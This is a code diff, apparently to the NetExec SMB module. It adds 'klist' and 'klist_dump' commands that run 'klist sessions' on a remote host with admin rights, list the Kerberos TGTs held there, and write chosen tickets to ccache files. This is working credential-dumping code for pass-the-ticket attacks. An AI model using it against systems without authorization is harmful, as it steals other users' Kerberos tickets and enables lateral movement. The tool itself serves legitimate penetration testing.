@@ -63,6 +63,7 @@ from impacket.dcerpc.v5 import tsts as TSTS
 from nxc.config import process_secret, host_info_colors, check_guest_account, display_dc
 from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
 from nxc.helpers.misc import gen_random_string, validate_ntlm
+from nxc.helpers.klist import parse_klist_sessions, collect_tgts, select_sessions, write_ccache, fmt_ticket_time, ccache_path
 from nxc.logger import NXCAdapter
 from nxc.paths import NXC_PATH
 from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
@@ -1376,6 +1377,49 @@ class smb(connection):
             self.logger.success("Enumerated qwinsta sessions")
             for row in result:
                 self.logger.highlight(row)
+
+    @requires_admin
+    def klist(self):
+        output = self.execute("klist sessions", True)
+        if not output:
+            self.logger.fail("Failed to enumerate Kerberos sessions")
+            return
+        sessions = parse_klist_sessions(output)
+        tgts = collect_tgts(sessions, lambda cmd: self.execute(cmd, True), self.logger)
+        if not tgts:
+            self.logger.fail("No Kerberos TGTs found")
+            return
+        self.logger.success(f"Found {len(tgts)} TGT(s)")
+        width = max(len(account) for _, account, _ in tgts)
+        for i, (logon_hex, account, info) in enumerate(tgts, 1):
+            self.logger.highlight(f"  [{i}] {account:<{width}}  {logon_hex}  (expires {fmt_ticket_time(info['end_time'])})")
+
+    @requires_admin
+    def klist_dump(self):
+        output = self.execute("klist sessions", True)
+        if not output:
+            self.logger.fail("Failed to enumerate Kerberos sessions")
+            return
+        sessions = parse_klist_sessions(output)
+        tgts = collect_tgts(sessions, lambda cmd: self.execute(cmd, True), self.logger)
+        tgts, error = select_sessions(tgts, self.args.klist_dump)
+        if error:
+            self.logger.fail(error)
+            return
+        if not tgts:
+            self.logger.fail("No valid TGTs dumped")
+            return
+
+        output_prefix = self.output_file_template.format(output_folder="klist")
+        os.makedirs(os.path.dirname(output_prefix), exist_ok=True)
+
+        written = []
+        for logon_hex, account, info in tgts:
+            path = ccache_path(output_prefix, info["client"], info["realm"], logon_hex)
+            write_ccache(info, path)
+            written.append(path)
+            self.logger.highlight(f"{account}  (expires {fmt_ticket_time(info['end_time'])})")
+        self.logger.success(f"Dumped {len(written)} TGT(s) to {os.path.dirname(output_prefix)}")
 
     @requires_admin
     def tasklist(self):
